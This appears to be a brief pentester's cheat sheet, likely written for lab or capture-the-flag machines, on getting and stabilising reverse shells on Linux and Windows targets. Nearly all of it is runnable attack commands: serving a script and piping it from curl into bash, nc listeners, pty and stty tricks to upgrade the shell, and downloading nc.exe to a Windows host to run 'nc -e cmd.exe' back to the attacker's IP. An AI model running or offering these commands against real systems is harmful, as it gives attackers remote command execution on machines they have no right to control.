## Linux
run server and expose rev.sh as file:
```
python3 -m http.server 80
```

on local machine call:
```
nc -lnvp 1337
```

on remote machine call:
```
curl 10.10.14.106/rev.sh|bash
```

- upgrade shell to bash:
```
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- then to make if fully interactive:
- We press `CTRL^Z` to suspend the shell momentaneously and execute the command below
```bash
stty raw -echo; fg
```
We won't see any output, but we can type reset and specify xterm as the terminal type
```bash
[1]  + continued  nc -nlvp 4444
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```
Command above will return us to the remote machine's shell. Now we need to make sure that the following variables are set as following:
```bash
export TERM=xterm
export SHELL=bash
```
change size:
```bash
# on your system
stty size
# on the reverse shell
stty rows x columns y
```
see also: https://gist.github.com/oscar-rk/f27464d7ab0c1fac4adf383b8a3527d3

## Windows
get nc.exe:
```bash
sudo apt install windows-binaries
```

run server and expose rev.sh as file:
```bash
python3 -m http.server 80
```

on local machine call:
```bash
nc -lnvp 1337
```

on remote machine in a directory where allowed to write:
```bash
wget http://10.10.14.9/nc.exe -outfile nc64.exe
.\nc.exe -e cmd.exe 10.10.14.9 1337
```

# Known issues

- on windows many ports are blocked by the firewall but ports like 443 should work